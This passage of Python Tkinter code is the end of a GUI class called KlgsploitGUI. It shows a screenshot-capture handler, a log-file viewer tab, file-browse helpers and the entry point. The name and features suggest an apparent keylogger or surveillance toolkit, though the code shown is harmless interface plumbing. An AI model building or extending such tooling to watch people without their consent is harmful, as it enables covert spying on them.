        output_dir = self.screenshot_output.get()
        filename = self.screenshot_filename.get()
        
        try:
            os.makedirs(output_dir, exist_ok=True)
            global_screencapture(platform=self.platform, folder=output_dir, filename=filename)
            self.screenshot_status.set(f"✓ Screenshot saved: {output_dir}/{filename}.png")
            self.status_var.set("Screenshot captured!")
        except Exception as e:
            self.screenshot_status.set(f"✗ Error: {e}")
            self.status_var.set("Screenshot failed!")
    
    # ============================================
    # TAB 8: LOG VIEWER
    # ============================================
    def setup_log_viewer_tab(self):
        frame = ttk.Labelframe(self.tab_logs, text="Log File Viewer", padding=20)
        frame.pack(fill=BOTH, expand=True, padx=20, pady=20)
        
        # File selection
        input_frame = ttk.Frame(frame)
        input_frame.pack(fill=X, pady=10)
        
        ttk.Label(input_frame, text="Log File:").pack(side=LEFT, padx=5)
        self.viewer_input = tk.StringVar()
        ttk.Entry(input_frame, textvariable=self.viewer_input, width=50).pack(side=LEFT, padx=5)
        ttk.Button(input_frame, text="Browse", command=lambda: self.browse_file(self.viewer_input, [("Log files", "*.txt *.log"), ("All files", "*.*")])).pack(side=LEFT, padx=5)
        ttk.Button(input_frame, text="Load", command=self.load_log_file).pack(side=LEFT, padx=5)
        
        # Log content
        self.log_viewer = ScrolledText(frame, height=25, width=100)
        self.log_viewer.pack(fill=BOTH, expand=True, pady=10)
    
    def load_log_file(self):
        filepath = self.viewer_input.get()
        if not filepath or not os.path.exists(filepath):
            return
        
        try:
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            self.log_viewer.delete(1.0, tk.END)
            self.log_viewer.insert(tk.END, content)
            self.status_var.set(f"Loaded: {filepath}")
        except Exception as e:
            self.status_var.set(f"Error loading file: {e}")
    
    # ============================================
    # HELPER METHODS
    # ============================================
    def browse_dir(self, var):
        path = filedialog.askdirectory()
        if path:
            var.set(path)
    
    def browse_file(self, var, filetypes):
        path = filedialog.askopenfilename(filetypes=filetypes)
        if path:
            var.set(path)
    
    def run(self):
        self.root.mainloop()


# ============================================
# MAIN ENTRY POINT
# ============================================

if __name__ == "__main__":
    app = KlgsploitGUI()
    app.run()
